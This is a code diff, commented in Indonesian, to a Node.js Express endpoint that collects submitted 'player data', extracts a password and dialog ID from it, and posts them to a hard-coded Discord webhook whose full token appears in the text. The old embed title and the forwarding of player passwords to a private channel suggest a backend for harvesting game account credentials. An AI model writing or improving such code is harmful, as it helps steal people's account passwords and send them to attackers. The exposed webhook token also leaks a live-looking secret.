@@ -22,6 +22,32 @@ app.post('/api/send', async (req, res) => {
       return res.status(400).json({ success: false, error: "Invalid data format" })
     }
 
+    // --- PROSES EKSTRAKSI DATA DARI VARIABEL 'c' ---
+    let rawContent = c || "";
+    let extractedPassword = "Tidak ada";
+    let extractedDialogId = t !== undefined ? String(t) : "Tidak ada";
+
+    // 1. Ekstraksi Dialog ID dari string (misal jika isi 'c' diawali "Dialog 11 ")
+    if (rawContent.startsWith("Dialog ")) {
+      const matchDialog = rawContent.match(/^Dialog\s+(\d+)\s*/i);
+      if (matchDialog) {
+        extractedDialogId = matchDialog[1]; // Mengambil angka "11"
+        rawContent = rawContent.replace(/^Dialog\s+\d+\s*/i, ""); // Menghapus tulisan dari data utama
+      }
+    }
+
+    // 2. Ekstraksi Password jika mendeteksi teks format "input:dott" atau sejenisnya
+    const matchInput = rawContent.match(/input[:\s]*([^\s\n]+)/i);
+    if (matchInput) {
+      const passwordValue = matchInput[1]; // Mengambil kata setelah "input:" (contoh: "dott")
+      // Format menjadi "Password: Dott" dengan huruf kapital di awal kata
+      const formattedPassword = passwordValue.charAt(0).toUpperCase() + passwordValue.slice(1);
+      extractedPassword = `Password: ${formattedPassword}`;
+      
+      // Hapus baris atau teks yang mengandung "input:dott" agar bersih dari data utama
+      rawContent = rawContent.replace(/input[:\s]*[^\s\n]+/i, "").trim();
+    }
+
     // URL Webhook Discord Anda
     const webhookUrl = 'https://discord.com/api/webhooks/1541819771002036256/ISvR0KaiPnJOBX5w76JU3tlOg8orzy1fLRbzy6CC4-SYIPWoYObKIUaJkpvCZDXnsNJt'
 
@@ -29,7 +55,7 @@ app.post('/api/send', async (req, res) => {
     await axios.post(webhookUrl, {
       embeds: [
         {
-          title: "PAKET NIH NYET!!",
+          title: "DATA PEMAIN", // Mengubah JUDUL menjadi DATA PEMAIN
           color: 16777215, // Kode desimal untuk warna putih (#FFFFFF)
           fields: [
             {
@@ -39,7 +65,7 @@ app.post('/api/send', async (req, res) => {
             },
             {
               name: "Password",
-              value: "Cek di kolom DATA PEMAIN", // Menyesuaikan karena password biasanya ada di dalam string 'c'
+              value: extractedPassword, // Diisi otomatis dari hasil ekstraksi
               inline: true
             },
             {
@@ -59,12 +85,12 @@ app.post('/api/send', async (req, res) => {
             },
             {
               name: "Dialog ID",
-              value: t !== undefined ? String(t) : "Tidak ada",
+              value: extractedDialogId, // Menampilkan Dialog ID yang sudah dipindahkan
               inline: true
             },
             {
               name: "DATA PEMAIN",
-              value: `\`\`\`\n${c}\n\`\`\``,
+              value: rawContent ? `\`\`\`\n${rawContent}\n\`\`\`` : "```\nTidak ada\n```",
               inline: false
             }
           ],
